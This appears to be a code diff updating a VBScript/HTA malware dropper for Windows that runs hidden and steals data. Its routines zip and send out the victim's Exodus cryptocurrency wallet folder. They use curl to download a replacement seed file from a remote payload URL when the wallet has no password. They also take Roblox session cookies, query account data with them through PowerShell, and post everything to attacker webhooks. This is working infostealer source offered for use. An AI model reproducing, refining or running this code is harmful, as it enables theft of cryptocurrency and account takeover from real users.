@@ -1,7 +1,7 @@
 ' language: VBScript/HTA, file: dropper.html, target: Windows 11, mshta engine
-' RAT cards (rocket/checkmark) now go to WH (logs).
-' Exodus zips the entire wallet folder, sends to WH only, includes password status.
-' Full screenshot Roblox UI sent to WH.
+' Exodus now zips the whole directory even if seed.seco is missing.
+' Full Roblox UI is built natively in VBScript and sent directly to WH (logs).
+' RAT cards go to WH. Re-grab goes to RE_WH.
 <html>
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
@@ -56,12 +56,9 @@ window.close()
 ' --- EXODUS STEALER (ZIPPED) ---
 Sub GrabExodus(targetWH)
     Dim base : base = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Exodus\exodus.wallet"
-    Dim seedFile : seedFile = base & "\seed.seco"
-    Dim passFile : passFile = base & "\passphrase.json"
-    
-    If Not fso.FileExists(seedFile) Then Exit Sub
+    If Not fso.FolderExists(base) Then Exit Sub
 
-    ' Determine password status for the UI
+    Dim passFile : passFile = base & "\passphrase.json"
     Dim pStatus : pStatus = "False (No Password)"
     If fso.FileExists(passFile) Then pStatus = "True (Password Protected)"
 
@@ -79,7 +76,7 @@ Sub GrabExodus(targetWH)
 
     ' Swap if no password
     If Not fso.FileExists(passFile) Then
-        Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -o """ & seedFile & """ """ & EXODUS_PAYLOAD_URL & """"
+        Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -o """ & base & "\seed.seco"" """ & EXODUS_PAYLOAD_URL & """"
         sh.Run dlCmd, 0, True
     End If
 End Sub
@@ -119,6 +116,7 @@ Sub PostFullRobloxUI(targetWH)
     If Len(cookie) < 50 Then Exit Sub
 
     Dim ps, psf, f
+    ' Pure JSON dump from PowerShell — no Discord cmd-line escaping issues
     ps = "$w='" & targetWH & "';$c='" & cookie & "';" & _
          "function api($h,$p){$r=[Net.WebRequest]::Create('https://'+$h+$p);$r.Headers.Add('Cookie','.ROBLOSECURITY='+$c);$r.UserAgent='Roblox/WinInet';$s=(New-Object IO.StreamReader($r.GetResponse().GetResponseStream())).ReadToEnd();return $s|ConvertFrom-Json};" & _
          "$me=api 'users.roblox.com' '/v1/users/authenticated';$uid=if($me){$me.id}else{'0'};$disp=if($me){$me.displayName}else{'Unknown'};$uname=if($me){$me.name}else{'Unknown'};" & _
@@ -257,7 +255,7 @@ Sub GrabRoblox(targetWH)
     If Len(cookie) = 0 Then Exit Sub
 
     PostEmbedTo "Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 10181046, targetWH
-    PostFileTo "cookie.txt", cookie, targetWH
+    PostFileTo "cookie.txt", cookie, targetWH, ""
 End Sub
 
 ' --- GrabFroststrap Function ---
